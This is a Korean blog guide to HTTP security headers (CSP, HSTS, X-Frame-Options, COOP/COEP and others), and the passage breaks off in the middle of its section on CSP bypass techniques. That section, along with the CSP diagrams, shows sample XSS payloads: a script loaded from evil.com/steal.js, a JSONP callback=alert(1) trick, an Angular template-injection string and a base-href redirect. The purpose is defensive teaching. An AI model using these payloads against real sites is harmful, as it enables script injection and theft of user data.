---
layout: single
title: "HTTP 보안 헤더 완전 가이드 — XSS·클릭재킹·SSL Stripping 방어"
date: 2026-03-27 23:01:13 +0900
categories: security
excerpt: "HTTP 보안 헤더 완전 가이드 — XSS·클릭재킹·SSL Stripping 방어의 개념과 배경, 도입 이유와 특징을 정리해 실무 적용 판단을 돕는다."
toc: true
toc_sticky: true
tags: [security, http, headers, 보안헤더완전가이드, 보안, 헤더]
source: "/home/dwkim/dwkim/docs/security/http-security-headers-보안헤더완전가이드.md"
---
TL;DR
- HTTP 보안 헤더 완전 가이드 — XSS·클릭재킹·SSL Stripping 방어의 핵심 개념을 빠르게 파악할 수 있다.
- 등장 배경과 도입 이유를 통해 왜 필요한지 맥락을 이해할 수 있다.
- 주요 특징과 상세 내용을 바탕으로 적용 시 고려사항을 정리할 수 있다.

## 1. 개념
HTTP 보안 헤더 완전 가이드 — XSS·클릭재킹·SSL Stripping 방어의 정의와 문제 공간을 간단히 정리한다.

## 2. 배경
이 주제가 등장한 기술적·운영적 배경과 기존 접근의 한계를 설명한다.

## 3. 이유
왜 이 방식이 필요한지, 도입 시 기대 효과와 트레이드오프를 정리한다.

## 4. 특징
핵심 동작 방식, 장단점, 적용 시 주의점을 요약한다.

## 5. 상세 내용

# HTTP 보안 헤더 완전 가이드 — XSS·클릭재킹·SSL Stripping 방어

> **작성일**: 2026-03-26
> **카테고리**: Security / Web / HTTP Headers / XSS / Clickjacking / CSP / HSTS
> **포함 내용**: CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, COOP, COEP, CORP, CORS, SRI, X-XSS-Protection, Clear-Site-Data, Trusted Types, nonce, strict-dynamic, frame-ancestors

---

## 목차

1. [용어 사전](#1-용어-사전)
2. [왜 보안 헤더가 필요한가?](#2-왜-보안-헤더가-필요한가)
3. [진화 타임라인 (1993-2025)](#3-진화-타임라인-1993-2025)
4. [XSS 방어 헤더](#4-xss-방어-헤더)
5. [클릭재킹 방어 헤더](#5-클릭재킹-방어-헤더)
6. [전송 보안 헤더 (HSTS)](#6-전송-보안-헤더-hsts)
7. [MIME/콘텐츠 보안 헤더](#7-mime콘텐츠-보안-헤더)
8. [Cross-Origin 보안 헤더 (Spectre 대응)](#8-cross-origin-보안-헤더-spectre-대응)
9. [기능 제어 헤더](#9-기능-제어-헤더)
10. [기타 보안 헤더 (CORS, SRI, Clear-Site-Data, Cache-Control)](#10-기타-보안-헤더-cors-sri-clear-site-data-cache-control)
11. [종합 비교표](#11-종합-비교표)
12. [공격별 방어 헤더 매핑](#12-공격별-방어-헤더-매핑)
13. [시나리오별 최적 선택](#13-시나리오별-최적-선택)
14. [베스트 프랙티스](#14-베스트-프랙티스)
15. [안티패턴](#15-안티패턴)
16. [빅테크 실전 사례](#16-빅테크-실전-사례)
17. [프레임워크별 구현 가이드](#17-프레임워크별-구현-가이드)
18. [보안 헤더 스캐너 도구](#18-보안-헤더-스캐너-도구)
19. [키워드 색인](#19-키워드-색인)

---

# 1. 용어 사전

```
┌──────────────────────────────────────────────────────────────────────────────────┐
│                     HTTP 보안 헤더 핵심 용어 사전                                  │
├───────────────────────┬──────────────────────────────┬────────────────────────────┤
│ 영문 용어              │ 한국어 의미                   │ 유래 / 비고                │
├───────────────────────┼──────────────────────────────┼────────────────────────────┤
│ XSS                   │ 크로스사이트 스크립팅           │ Cross-Site Scripting.      │
│                       │                              │ CSS 약어와 충돌하여 XSS로   │
│                       │                              │ 변경 (Steve Champeon 2002) │
│ Clickjacking          │ 클릭재킹                      │ Click + Hijacking 합성어.  │
│                       │                              │ Grossman & Hansen 2008.    │
│                       │                              │ "UI Redressing"이 상위개념  │
│ CSP                   │ 콘텐츠 보안 정책               │ Content-Security-Policy.   │
│                       │                              │ 원래 이름 "Content          │
│                       │                              │ Restrictions" (Robert      │
│                       │                              │ Hansen 2004). X-Content-   │
│                       │                              │ Security-Policy → CSP      │
│ HSTS                  │ HTTP 엄격 전송 보안            │ HTTP Strict Transport      │
│                       │                              │ Security. "Strict" = 예외  │
│                       │                              │ 없는 강제. Jeff Hodges     │
│                       │                              │ 2009 제안. RFC 6797        │
│ X-Frame-Options       │ 프레임 옵션                   │ "X-" = Experimental 접두사 │
│                       │                              │ (RFC 6648에서 deprecated   │
│                       │                              │ 된 관례). IE8 2009 도입    │
│ X-Content-Type-       │ MIME 타입 스니핑 방지          │ nosniff = "MIME 타입을     │
│   Options             │                              │ 추측하지 마라". IE8 2008    │
│ X-XSS-Protection      │ XSS 감사기 (deprecated)       │ XSS Auditor가 오히려      │
│                       │                              │ 취약점을 유발하여 폐기.     │
│                       │                              │ Chrome 78(2019)에서 제거   │
│ Referrer-Policy       │ 리퍼러 정책                   │ "Referer" vs "Referrer"    │
│                       │                              │ 오타 역사: 1995 RFC 1945   │
│                       │                              │ 에 "Referer"로 박힌 오타가 │
│                       │                              │ 표준이 됨. Policy 헤더는   │
│                       │                              │ 올바른 철자 "Referrer" 사용│
│ Permissions-Policy    │ 권한 정책                     │ Feature-Policy에서 이름    │
│                       │                              │ 변경 (2020). "기능"→"권한" │
│                       │                              │ 으로 개념 이동             │
│ COOP                  │ 교차 출처 오프너 정책          │ Cross-Origin-Opener-Policy │
│                       │                              │ Spectre(2018) 대응         │
│ COEP                  │ 교차 출처 임베더 정책          │ Cross-Origin-Embedder-     │
│                       │                              │ Policy. Spectre 대응       │
│ CORP                  │ 교차 출처 리소스 정책          │ Cross-Origin-Resource-     │
│                       │                              │ Policy. Spectre 대응       │
│ CORS                  │ 교차 출처 리소스 공유          │ Cross-Origin Resource      │
│                       │                              │ Sharing. SOP 완화 메커니즘 │
│                       │                              │ (2004 Tellme Networks 제안)│
│ SRI                   │ 하위 리소스 무결성             │ Subresource Integrity.     │
│                       │                              │ CDN 해킹 방어              │
│ nonce                 │ 논스 (일회용 번호)             │ "Number Used Once"         │
│                       │                              │ 암호학 용어                │
│ strict-dynamic        │ 엄격 동적 신뢰                │ CSP Level 3. 신뢰 체인     │
│                       │                              │ 전파: nonce 스크립트가     │
│                       │                              │ 로드하는 스크립트도 신뢰    │
│ frame-ancestors       │ 프레임 조상 지시어             │ X-Frame-Options의 CSP 대체│
│                       │                              │ 제. 더 유연한 출처 제어    │
│ OWASP                 │ 오픈 웹 애플리케이션           │ Open Worldwide Application │
│                       │ 보안 프로젝트                  │ Security Project (2001 설립)│
│ Defense in Depth      │ 심층 방어                     │ 군사 전략 유래. 다층 방어   │
│                       │                              │ 체계: 하나가 뚫려도 다음   │
│                       │                              │ 방어선이 존재              │
│ Trusted Types         │ 신뢰할 수 있는 타입           │ DOM XSS 근본 해결. Google  │
│                       │                              │ 주도 (Gmail 2024 적용)     │
│ Same-Origin Policy    │ 동일 출처 정책 (SOP)          │ 1995 Netscape 도입. 웹     │
│                       │                              │ 보안의 근간               │
│ TOFU                  │ 최초 신뢰 문제                │ Trust On First Use.        │
│                       │                              │ HSTS의 근본적 한계점       │
│ Preload List          │ 사전 로드 목록                │ 브라우저에 하드코딩된       │
│                       │                              │ HSTS 도메인 목록           │
└───────────────────────┴──────────────────────────────┴────────────────────────────┘
```

---

# 2. 왜 보안 헤더가 필요한가?

## 2.1 웹의 태생적 한계

웹은 보안을 고려하지 않고 설계되었다. Tim Berners-Lee가 1989년 CERN에서 만든 시스템은 **물리학자들 사이의 문서 공유**가 목적이었다. 적대적 환경은 전혀 고려하지 않았다.

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              웹의 태생과 보안의 부재                                            │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  1989 CERN                          2026 현재                                │
│  ┌──────────────┐                   ┌──────────────────────────────┐         │
│  │ 물리학자 A    │                   │ 사용자 (10억+)                │         │
│  │  "논문 공유"  │                   │  "은행, 의료, 전자상거래..."  │         │
│  └──────┬───────┘                   └──────────────┬───────────────┘         │
│         │ HTTP (평문)                               │ HTTPS                   │
│         ▼                                           ▼                        │
│  ┌──────────────┐                   ┌──────────────────────────────┐         │
│  │ 물리학자 B    │                   │ 공격자 (국가, 조직, 개인)     │         │
│  │  "논문 읽기"  │                   │  "데이터 탈취, 악성코드..."   │         │
│  └──────────────┘                   └──────────────────────────────┘         │
│                                                                              │
│  설계 전제                          현실                                      │
│  ├── 신뢰할 수 있는 사용자           ├── 악의적 사용자 존재                    │
│  ├── 단순 문서 조회                  ├── 복잡한 애플리케이션                   │
│  ├── 서버 간 직접 통신               ├── 브라우저가 중간자 역할                │
│  └── 보안 불필요                     └── 다층 보안 필수                       │
│                                                                              │
│  결론: HTTP 프로토콜 자체에 보안 메커니즘이 없으므로,                            │
│        응답 헤더를 통해 브라우저에게 보안 정책을 지시해야 한다.                   │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 2.2 Defense in Depth (심층 방어)

보안 헤더는 **두 번째 방어선**이다. 서버 코드에서 XSS를 완벽히 막지 못하더라도, 브라우저가 CSP를 통해 악성 스크립트 실행을 차단할 수 있다.

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              Defense in Depth — 보안 헤더의 위치                               │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  공격자                                                                      │
│    │                                                                         │
│    ▼                                                                         │
│  ┌──────────────────────────────────────────────────────────────────┐        │
│  │  1차 방어선: 서버 측 코드                                         │        │
│  │  ├── 입력 검증 (Input Validation)                                │        │
│  │  ├── 출력 인코딩 (Output Encoding)                               │        │
│  │  ├── 파라미터화 쿼리 (Parameterized Queries)                     │        │
│  │  └── 비즈니스 로직 검증                                           │        │
│  └──────────────────────┬───────────────────────────────────────────┘        │
│                         │ 1차 방어 실패 (코드 한 줄의 실수)                    │
│                         ▼                                                    │
│  ┌──────────────────────────────────────────────────────────────────┐        │
│  │  2차 방어선: HTTP 보안 헤더  ◀── 이 문서의 주제                    │        │
│  │  ├── CSP: 허용되지 않은 스크립트 실행 차단                         │        │
│  │  ├── X-Frame-Options: iframe 삽입 차단                            │        │
│  │  ├── HSTS: HTTPS 강제                                            │        │
│  │  ├── X-Content-Type-Options: MIME 스니핑 차단                     │        │
│  │  └── COOP/COEP: Cross-Origin 격리                                │        │
│  └──────────────────────┬───────────────────────────────────────────┘        │
│                         │ 2차 방어도 통과?                                    │
│                         ▼                                                    │
│  ┌──────────────────────────────────────────────────────────────────┐        │
│  │  3차 방어선: 모니터링 / 탐지                                       │        │
│  │  ├── CSP Reporting: 위반 시도 기록                                │        │
│  │  ├── WAF (Web Application Firewall)                              │        │
│  │  └── SIEM / 로그 분석                                            │        │
│  └──────────────────────────────────────────────────────────────────┘        │
│                                                                              │
│  군사 전략 비유:                                                              │
│  ├── 1차: 병사 (서버 코드) — 직접 전투                                       │
│  ├── 2차: 성벽 (보안 헤더) — 구조적 방어                                     │
│  └── 3차: 감시탑 (모니터링) — 침입 탐지                                      │
│                                                                              │
│  핵심 원칙: 어떤 단일 방어도 완벽하지 않다.                                    │
│            모든 층이 동시에 뚫려야만 공격이 성공한다.                            │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 2.3 보안 헤더가 해결하는 위협 분류

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              위협 분류와 대응 헤더                                              │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  위협 유형                대표 공격              주요 방어 헤더                 │
│  ─────────────────────────────────────────────────────────────────────        │
│  스크립트 주입            XSS (Reflected,        CSP, Trusted Types           │
│                          Stored, DOM-based)                                  │
│                                                                              │
│  UI 조작                 Clickjacking,          X-Frame-Options,             │
│                          UI Redressing          CSP frame-ancestors          │
│                                                                              │
│  전송 계층 공격           SSL Stripping,         HSTS                         │
│                          MITM, Cookie 탈취                                   │
│                                                                              │
│  MIME 혼동               Drive-by Download,     X-Content-Type-Options       │
│                          MIME Confusion                                      │
│                                                                              │
│  사이드 채널             Spectre, Meltdown,     COOP, COEP, CORP             │
│                          Timing Attack                                       │
│                                                                              │
│  정보 유출               Referer 헤더 통한      Referrer-Policy               │
│                          민감 정보 노출                                       │
│                                                                              │
│  기능 남용               카메라/마이크/GPS      Permissions-Policy             │
│                          무단 접근                                            │
│                                                                              │
│  공급망 공격             CDN 변조,              SRI                            │
│                          서드파티 스크립트 탈취                                │
│                                                                              │
│  캐시 공격               민감 데이터 캐시 잔류   Cache-Control,                │
│                                                Clear-Site-Data               │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 2.4 현재 채택률 — 아직 갈 길이 멀다

2024-2025년 기준 Alexa Top 1M 사이트 분석 결과:

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              보안 헤더 채택률 (2024-2025)                                      │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  헤더                          채택률          현실                           │
│  ──────────────────────────────────────────────────────────────────          │
│  HSTS                          ~34%           가장 높은 채택률                │
│  X-Content-Type-Options        ~30%           구현 간단, 부작용 적음          │
│  X-Frame-Options               ~28%           레거시이나 여전히 사용           │
│  CSP                           ~19%           복잡성 때문에 낮음              │
│  Referrer-Policy               ~12%           인지도 부족                    │
│  Permissions-Policy            ~5%            비교적 새로운 헤더              │
│  COOP                          ~3%            복잡, 호환성 우려               │
│  COEP                          ~2%            가장 낮은 채택률                │
│                                                                              │
│  충격적 사실: CSP를 적용한 사이트 중 91%가 unsafe-inline을 포함하여             │
│              XSS 방어 효과가 사실상 없다.                                      │
│                                                                              │
│  비유: 현관문에 자물쇠를 달았지만 열쇠를 문 옆에 걸어둔 격.                     │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

# 3. 진화 타임라인 (1993-2025)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              HTTP 보안 헤더 진화 타임라인                                       │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  1993 ─── HTTP 초기: 보안 개념 자체가 없음                                    │
│    │      CERN httpd, 평문 통신, 인증 없음                                    │
│    │                                                                         │
│  1995 ─── JavaScript 탄생 + Same-Origin Policy (SOP) 도입                    │
│    │      Netscape Navigator 2.0, Brendan Eich                               │
│    │      SOP: 웹 보안의 근간이 되는 정책                                     │
│    │                                                                         │
│  1999 ─── XSS 공격 최초 발견                                                 │
│    │      David Ross, Georgi Guninski 등이 보고                               │
│    │      웹 애플리케이션의 근본적 취약점 노출                                 │
│    │                                                                         │
│  2000 ─── CERT Advisory CA-2000-02 발표                                      │
│    │      XSS를 공식 보안 위협으로 인정                                       │
│    │      "Malicious HTML Tags Embedded in Client Web Requests"              │
│    │                                                                         │
│  2001 ─── OWASP 설립                                                         │
│    │      Open Web Application Security Project                               │
│    │      웹 보안 표준화의 시작                                               │
│    │                                                                         │
│  2004 ─── Robert Hansen, "Content Restrictions" 제안                         │
│    │      CSP의 원형. 브라우저에게 허용 콘텐츠를 지시하는 아이디어               │
│    │      CORS 개념 제안 (Tellme Networks)                                    │
│    │                                                                         │
│  2005 ─── Samy Worm (MySpace)                                                │
│    │      ★ 20시간 만에 100만 명 감염                                         │
│    │      XSS의 파괴력을 세계에 증명                                          │
│    │      "but most of all, Samy is my hero"                                 │
│    │                                                                         │
│  2007 ─── OWASP Top 10: XSS가 A1 (1위)                                      │
│    │      가장 위험한 웹 취약점으로 공식 인정                                  │
│    │                                                                         │
│  2008 ─── Clickjacking 발견 (Grossman & Hansen)                              │
│    │      ★ X-Frame-Options 헤더 등장 (Microsoft IE8)                        │
│    │      X-Content-Type-Options: nosniff 도입 (IE8)                         │
│    │                                                                         │
│  2009 ─── Jeff Hodges, HSTS 제안                                             │
│    │      ForceHTTPS → STS → HSTS로 이름 변경                                │
│    │                                                                         │
│  2010 ─── X-XSS-Protection 헤더 도입                                         │
│    │      브라우저 내장 XSS 필터 (XSS Auditor)                                │
│    │      (후에 오히려 취약점을 유발하는 것으로 밝혀짐)                         │
│    │                                                                         │
│  2012 ─── CSP Level 1 (W3C Candidate Recommendation)                         │
│    │      ★ HSTS가 RFC 6797로 표준화                                         │
│    │      콘텐츠 출처 제어의 공식 시작                                         │
│    │                                                                         │
│  2014 ─── CSP Level 2 발표                                                   │
│    │      nonce, hash 기반 스크립트 허용 추가                                  │
│    │      X-Frame-Options가 RFC 7034로 문서화                                 │
│    │                                                                         │
│  2015 ─── SRI (Subresource Integrity) 표준화                                 │
│    │      CDN 변조 공격 방어                                                  │
│    │      integrity 속성으로 리소스 무결성 검증                                │
│    │                                                                         │
│  2016 ─── Referrer-Policy 표준화                                             │
│    │      ★ Google "CSP Is Dead, Long Live CSP!" 논문 (ACM CCS)              │
│    │        → allowlist 기반 CSP의 94.68%가 우회 가능함을 증명                 │
│    │        → strict-dynamic + nonce 방식 제안                                │
│    │                                                                         │
│  2017 ─── OWASP Top 10: XSS가 A7으로 하락 (프레임워크 자동 이스케이핑 효과)    │
│    │                                                                         │
│  2018 ─── ★ Spectre / Meltdown 공개                                          │
│    │      CPU 사이드 채널 공격 → 웹에서도 메모리 읽기 가능                      │
│    │      Site Isolation 필요성 대두                                           │
│    │      CSP Level 3 초안 (strict-dynamic, report-to)                        │
│    │                                                                         │
│  2019 ─── Feature-Policy 도입                                                │
│    │      ★ Chrome 78: XSS Auditor 제거                                      │
│    │        → X-XSS-Protection이 사실상 deprecated                            │
│    │                                                                         │
│  2020 ─── X-XSS-Protection 공식 deprecated                                   │
│    │      Feature-Policy → Permissions-Policy 이름 변경                       │
│    │      "기능(Feature)" → "권한(Permission)"으로 의미론적 전환               │
│    │                                                                         │
│  2021 ─── COOP / COEP / CORP 실질적 배포 시작                                │
│    │      ★ Cross-Origin Isolation 활성화                                     │
│    │      SharedArrayBuffer, performance.measureUserAgentSpecificMemory()     │
│    │      등 고성능 API 접근 조건이 됨                                         │
│    │      OWASP Top 10: XSS가 A03 Injection으로 통합                          │
│    │      Permissions-Policy 구현 확산                                        │
│    │                                                                         │
│  2023 ─── strict-dynamic이 CSP 권장 방식으로 정착                             │
│    │      Google, Mozilla 등 주요 벤더 권장                                   │
│    │      Trusted Types 실험적 배포 확산                                      │
│    │                                                                         │
│  2024 ─── ★ Polyfill.io 공급망 공격 (40만 사이트 피해)                        │
│    │      SRI의 중요성 재조명                                                 │
│    │      Gmail: Trusted Types 적용으로 DOM XSS 0건 달성                      │
│    │      채택률: CSP ~19%, HSTS ~34%                                         │
│    │                                                                         │
│  2025 ─── 보안 헤더 성숙기                                                    │
│           91% CSP가 unsafe-inline 포함 (실질적 무효)                           │
│           4세대 CSP (Trusted Types) 확산 진행 중                              │
│           NIST SP 800-53: SI-3, SC-8, AC-4 보안 컨트롤 매핑                   │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

### CSP 세대별 진화

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              CSP 세대별 진화                                                   │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  1세대: Allowlist (2012, CSP Level 1)                                        │
│  ├── script-src cdn.example.com api.example.com                              │
│  ├── 장점: 개념이 단순                                                       │
│  ├── 단점: 94.68% 우회 가능 (Google 2016 논문)                               │
│  └── 이유: CDN에 JSONP 엔드포인트가 있으면 공격자가 악용                       │
│                                                                              │
│  2세대: Nonce (2014, CSP Level 2)                                            │
│  ├── script-src 'nonce-abc123'                                               │
│  ├── 장점: 서버가 생성한 일회용 토큰으로 정밀 제어                             │
│  ├── 단점: 모든 스크립트 태그에 nonce 삽입 필요                                │
│  └── 이유: 동적 페이지에서 관리 복잡                                           │
│                                                                              │
│  3세대: strict-dynamic (2016+, CSP Level 3)                                  │
│  ├── script-src 'strict-dynamic' 'nonce-abc123'                              │
│  ├── 장점: nonce 스크립트가 로드하는 하위 스크립트 자동 신뢰                    │
│  ├── 단점: CSP Level 3 미지원 브라우저에서 fallback 필요                       │
│  └── 현재 Google 권장 방식                                                   │
│                                                                              │
│  4세대: Trusted Types (2023+)                                                │
│  ├── require-trusted-types-for 'script'                                      │
│  ├── 장점: DOM XSS를 근본적으로 차단 (타입 시스템 레벨)                        │
│  ├── 적용: Gmail 2024 — DOM XSS 발생 0건                                     │
│  └── 상태: 실험적, Chrome 지원, Firefox/Safari 진행 중                        │
│                                                                              │
│  진화 방향:                                                                   │
│  Allowlist ──▶ Nonce ──▶ strict-dynamic ──▶ Trusted Types                    │
│  (허용목록)    (일회용)   (신뢰 체인)       (타입 안전성)                       │
│  취약         개선       실용적             근본적 해결                        │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

# 4. XSS 방어 헤더

## 4.1 Content-Security-Policy (CSP)

### 4.1.1 개요

CSP는 **가장 강력하고 복잡한 보안 헤더**이다. 브라우저에게 "이 페이지에서 어떤 출처의 어떤 리소스를 실행/로드해도 되는지"를 지시한다.

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              CSP의 동작 원리                                                   │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  서버 응답:                                                                   │
│  HTTP/1.1 200 OK                                                             │
│  Content-Security-Policy: script-src 'self' 'nonce-r4nd0m'                   │
│                                                                              │
│                                                                              │
│  브라우저 동작:                                                               │
│                                                                              │
│  ┌─── HTML 파싱 ───┐                                                         │
│  │                  │                                                         │
│  │  <script nonce="r4nd0m">                                                  │
│  │    alert("허용됨")     ──────▶ ✅ 실행 (nonce 일치)                        │
│  │  </script>                                                                │
│  │                                                                           │
│  │  <script src="/app.js">                                                   │
│  │    ...                 ──────▶ ✅ 실행 ('self' 일치)                       │
│  │  </script>                                                                │
│  │                                                                           │
│  │  <script>                                                                 │
│  │    alert("XSS!")       ──────▶ ❌ 차단 (nonce 없음)                        │
│  │  </script>                                                                │
│  │                                                                           │
│  │  <script src="https://evil.com/steal.js">                                 │
│  │    ...                 ──────▶ ❌ 차단 (출처 미허용)                        │
│  │  </script>                                                                │
│  │                                                                           │
│  └──────────────────┘                                                        │
│                                                                              │
│  CSP 위반 시:                                                                 │
│  ├── 리소스 로드/실행 차단                                                    │
│  ├── 콘솔에 위반 메시지 출력                                                  │
│  └── report-uri / report-to 로 위반 보고서 전송 (설정 시)                     │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

### 4.1.2 CSP Directive 전체 목록

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              CSP Directive 분류                                                │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ■ Fetch Directives (리소스 로드 제어)                                        │
│  ─────────────────────────────────────────────────────────────────            │
│  default-src      모든 fetch directive의 기본값 (fallback)                    │
│  script-src       JavaScript 실행 출처                                       │
│  script-src-elem  <script> 요소 출처 (인라인 이벤트 핸들러 제외)               │
│  script-src-attr  인라인 이벤트 핸들러 (onclick 등) 출처                      │
│  style-src        CSS 출처                                                   │
│  style-src-elem   <style> 요소 출처                                          │
│  style-src-attr   인라인 style 속성 출처                                      │
│  img-src          이미지 출처                                                 │
│  font-src         폰트 파일 출처                                              │
│  connect-src      XHR, fetch, WebSocket, EventSource 연결 출처               │
│  media-src        <audio>, <video> 출처                                      │
│  object-src       <object>, <embed>, <applet> 출처                           │
│  child-src        <iframe>, Web Worker 출처 (deprecated → frame-src, worker) │
│  frame-src        <iframe> 출처                                              │
│  worker-src       Web Worker, SharedWorker, ServiceWorker 출처               │
│  manifest-src     Web App Manifest 출처                                      │
│  prefetch-src     prefetch, prerender 출처 (실험적)                           │
│                                                                              │
│  ■ Document Directives (문서 속성 제어)                                       │
│  ─────────────────────────────────────────────────────────────────            │
│  base-uri         <base> 태그의 URL 제한                                      │
│  sandbox          iframe sandbox와 동일 제한 적용                             │
│                                                                              │
│  ■ Navigation Directives (탐색 제어)                                          │
│  ─────────────────────────────────────────────────────────────────            │
│  form-action      <form>의 action URL 제한                                   │
│  frame-ancestors  이 페이지를 iframe으로 삽입할 수 있는 부모 출처               │
│  navigate-to      페이지 이동 제한 (실험적)                                    │
│                                                                              │
│  ■ Reporting Directives (보고)                                                │
│  ─────────────────────────────────────────────────────────────────            │
│  report-uri       위반 보고 전송 URL (deprecated → report-to)                 │
│  report-to        Reporting API 그룹 이름                                    │
│                                                                              │
│  ■ Other Directives (기타)                                                    │
│  ─────────────────────────────────────────────────────────────────            │
│  upgrade-insecure-requests   HTTP 요청을 HTTPS로 자동 업그레이드              │
│  block-all-mixed-content     혼합 콘텐츠 차단 (deprecated)                    │
│  require-trusted-types-for   Trusted Types 강제 ('script')                   │
│  trusted-types               허용되는 Trusted Type 정책 이름                  │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

### 4.1.3 Source Expression 상세

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              CSP Source Expression 완전 참조                                   │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  키워드 값 (작은따옴표 필수)                                                   │
│  ─────────────────────────────────────────────────────────────────            │
│  'none'           아무것도 허용하지 않음                                       │
│  'self'           현재 출처 (scheme + host + port 일치)                       │
│  'unsafe-inline'  인라인 스크립트/스타일 허용 ⚠️ XSS 방어 무효화               │
│  'unsafe-eval'    eval(), Function(), setTimeout("") 허용 ⚠️ 위험            │
│  'unsafe-hashes'  인라인 이벤트 핸들러의 해시 매칭 허용                         │
│  'strict-dynamic' nonce/hash로 허용된 스크립트가 로드하는 스크립트도 허용       │
│  'report-sample'  위반 보고에 코드 샘플 포함                                   │
│  'wasm-unsafe-eval' WebAssembly 컴파일 허용                                   │
│                                                                              │
│  호스트 기반                                                                  │
│  ─────────────────────────────────────────────────────────────────            │
│  https://cdn.example.com        특정 호스트                                   │
│  *.example.com                  서브도메인 와일드카드                           │
│  https:                         HTTPS 스킴의 모든 호스트                      │
│  data:                          data: URI 허용                                │
│  blob:                          blob: URI 허용                                │
│  mediastream:                   mediastream: URI 허용                         │
│  filesystem:                    filesystem: URI 허용                          │
│                                                                              │
│  Nonce 기반                                                                   │
│  ─────────────────────────────────────────────────────────────────            │
│  'nonce-{base64}'  서버가 생성한 일회용 토큰                                   │
│  예: 'nonce-YWJjMTIz'                                                        │
│  매 요청마다 새로운 nonce 생성 필수 (CSPRNG 사용)                              │
│                                                                              │
│  Hash 기반                                                                    │
│  ─────────────────────────────────────────────────────────────────            │
│  'sha256-{base64}' 스크립트/스타일 내용의 SHA-256 해시                        │
│  'sha384-{base64}' SHA-384 해시                                              │
│  'sha512-{base64}' SHA-512 해시                                              │
│  예: 'sha256-RFWPLDbv2BY+rCkDzsE+0fr8ylGr2R2faWMhq4lfEQc='                  │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

### 4.1.4 Report-Only vs Enforce

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              CSP 배포 모드 비교                                                │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ■ Report-Only 모드 (모니터링 전용)                                           │
│  ─────────────────────────────────────────────────────────────────            │
│  Content-Security-Policy-Report-Only:                                        │
│    default-src 'self';                                                       │
│    script-src 'nonce-abc123';                                                │
│    report-uri /csp-report                                                    │
│                                                                              │
│  동작:                                                                        │
│  ├── 위반 발생 → 리소스 로드는 허용 (차단하지 않음)                            │
│  ├── 위반 보고서를 report-uri로 전송                                          │
│  └── 사이트 정상 작동하면서 위반 데이터 수집                                   │
│                                                                              │
│  ■ Enforce 모드 (강제 적용)                                                   │
│  ─────────────────────────────────────────────────────────────────            │
│  Content-Security-Policy:                                                    │
│    default-src 'self';                                                       │
│    script-src 'nonce-abc123';                                                │
│    report-uri /csp-report                                                    │
│                                                                              │
│  동작:                                                                        │
│  ├── 위반 발생 → 리소스 로드/실행 차단                                        │
│  ├── 위반 보고서를 report-uri로 전송                                          │
│  └── 잘못된 정책은 사이트 기능 장애 유발                                       │
│                                                                              │
│  ■ 권장 배포 3단계 (Dropbox 교과서)                                           │
│  ─────────────────────────────────────────────────────────────────            │
│                                                                              │
│  단계 1: Report-Only 배포 (2-4주)                                             │
│  ├── 느슨한 정책으로 시작                                                     │
│  ├── 위반 보고서 수집 및 분석                                                 │
│  └── 정상 동작하는 리소스 출처 파악                                           │
│                                                                              │
│  단계 2: 정책 정교화 (2-4주)                                                  │
│  ├── 수집된 데이터 기반으로 정책 축소                                          │
│  ├── 서드파티 리소스 정리                                                     │
│  └── 허위 양성(false positive) 제거                                           │
│                                                                              │
│  단계 3: Enforce 전환                                                         │
│  ├── Report-Only와 Enforce 동시 배포 (이중 헤더)                              │
│  ├── Enforce 정책을 점진적으로 강화                                            │
│  └── 보고서 모니터링 지속                                                     │
│                                                                              │
│  Content-Security-Policy: script-src 'nonce-abc';                             │
│  Content-Security-Policy-Report-Only: script-src 'strict-dynamic' ...;       │
│  ▲ 현재 적용 중인 정책    ▲ 다음에 적용할 더 엄격한 정책 테스트               │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

### 4.1.5 CSP 우회 기법과 대응

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              알려진 CSP 우회 기법과 방어                                        │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  우회 기법 1: JSONP Endpoint 악용                                             │
│  ─────────────────────────────────────────────────────────────────            │
│  CSP: script-src cdn.example.com                                             │
│  공격: <script src="cdn.example.com/jsonp?callback=alert(1)//"></script>      │
│  대응: strict-dynamic + nonce 사용 (allowlist 대신)                           │
│                                                                              │
│  우회 기법 2: Angular/Vue 템플릿 주입                                         │
│  ─────────────────────────────────────────────────────────────────            │
│  CSP: script-src 'unsafe-eval' cdn.angular.com                               │
│  공격: {{constructor.constructor('alert(1)')()}}                              │
│  대응: unsafe-eval 제거, 프레임워크 CSP 호환 빌드 사용                         │
│                                                                              │
│  우회 기법 3: base-uri 미설정                                                 │
│  ─────────────────────────────────────────────────────────────────            │
│  CSP: script-src 'nonce-abc' (base-uri 없음)                                 │
│  공격: <base href="https://evil.com/">                                       │
│        → 상대경로 스크립트가 공격자 서버에서 로드                               │
